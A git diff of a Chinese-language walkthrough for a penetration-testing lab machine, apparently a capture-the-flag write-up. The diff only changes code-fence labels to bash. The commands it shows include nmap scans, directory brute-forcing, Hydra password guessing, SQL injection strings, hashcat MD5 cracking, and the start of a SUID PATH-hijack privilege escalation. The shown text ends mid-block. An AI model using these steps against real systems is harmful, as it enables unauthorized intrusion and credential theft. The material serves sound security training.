@@ -12,7 +12,7 @@ tags:
 
 ## 主机发现
 
-```
+```bash
 sudo nmap -sn 10.10.10.10
 ```
 
@@ -25,21 +25,21 @@ sudo nmap -sn 10.10.10.10
 使用 nmap 对靶机进行扫描，寻找靶机开放的端口以便于进行更进一步的渗透测试
 
 扫描开放的端口
-```
+```bash
 sudo nmap --min-rate 10000 -p- 10.10.10.7
 ```
 
 ![P2](P2.png)
 
 扫描开放端口的基本信息，并将结果保存到本地以便于随时观看
-```
+```bash
 sudo nmap -sT -sC -sV -p80,111,777,48675 10.10.10.7 -oA nmap/Scan
 ```
 
 ![P4](P4.png)
 
 使用 nmap 进行默认的漏洞脚本扫描，并将结果保存到本地
-```
+```bash
 sudo nmap --script=vuln -p80,111,777,48675 10.10.10.7 -oA nmap/Script
 ```
 
@@ -58,7 +58,7 @@ sudo nmap --script=vuln -p80,111,777,48675 10.10.10.7 -oA nmap/Script
 
 查看源码发现这是一个 gif 文件，把他下载下来
 
-```
+```bash
 wget http://10.10.10.7/main.git
 ```
 
@@ -66,7 +66,7 @@ wget http://10.10.10.7/main.git
 
 使用 gobuster 执行目录爆破，尝试发现新的目录
 
-```
+```bash
 sudo gobuster dir -u http://10.10.10.7 -w /usr/share/dirb/wordlists/common.txt
 ```
 
@@ -80,7 +80,7 @@ sudo gobuster dir -u http://10.10.10.7 -w /usr/share/dirb/wordlists/common.txt
 
 拿到 gif 图片，先使用 strings 查看有没有有价值的字符串
 
-```
+```bash
 strings main.gif
 ```
 
@@ -90,7 +90,7 @@ strings main.gif
 
 继续使用 Exiftool 发掘 gif 剩余价值
 
-```
+```bash
 exiftool main.gif
 ```
 
@@ -114,7 +114,7 @@ Comment 处写着 kzMb5nVYJw ，说明这串字符串极有可能是突破口，
 
 查看网络发现这是一个 post 请求，使用 Hydra 对 hash 进行破解
 
-```
+```bash
 sudo hydra -l "key" -P /usr/share/wordlists/rockyou.txt 10.10.10.7 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key"
 ```
 
@@ -142,7 +142,7 @@ sudo hydra -l "key" -P /usr/share/wordlists/rockyou.txt 10.10.10.7 http-form-pos
 中的 3 ，
 完整的测试代码如下
 
-```
+```bash
 "
 
 " or 1=1 -- -
@@ -179,7 +179,7 @@ sudo hydra -l "key" -P /usr/share/wordlists/rockyou.txt 10.10.10.7 http-form-pos
 
 使用 hash-identifier 发现是 MD5 加密，使用 hashcat 破解它
 
-```
+```bash
 vim hash/hash.lst
 
 sudo hashcat -m 0 -a 0 hash/hash.lst /usr/share/wordlists/rockyou.txt
@@ -192,13 +192,13 @@ sudo hashcat -m 0 -a 0 hash/hash.lst /usr/share/wordlists/rockyou.txt
 
 使用 ssh 登入靶机
 
-```
+```bash
 sudo ssh ramses@10.10.10.7 -p777 
 ```
 
 查看历史记录
 
-```
+```bash
 history
 ```
 
@@ -207,7 +207,7 @@ history
 发现 /var/www 目录可能藏着提权的文件，
 根据提示进行操作
 
-```
+```bash
 cd /var/www
 cd backup/
 ls
@@ -218,7 +218,7 @@ cat readme.txt
 
 没什么价值，查看文件权限
 
-```
+```bash
 ls -liah
 ```
 
@@ -226,7 +226,7 @@ ls -liah
 
 提示文件可能有 s 位执行权限，查看含有 s 位执行权限的文件
 
-```
+```bash
 find / -perm -u=s -type f 2>/dev/null
 ./procwatch
 ```
@@ -239,7 +239,7 @@ find / -perm -u=s -type f 2>/dev/null
 
 SUID 环境变量提权
 
-```
+```bash
 ln -s /bin/sh ps
 
 export PATH=.:$PATH
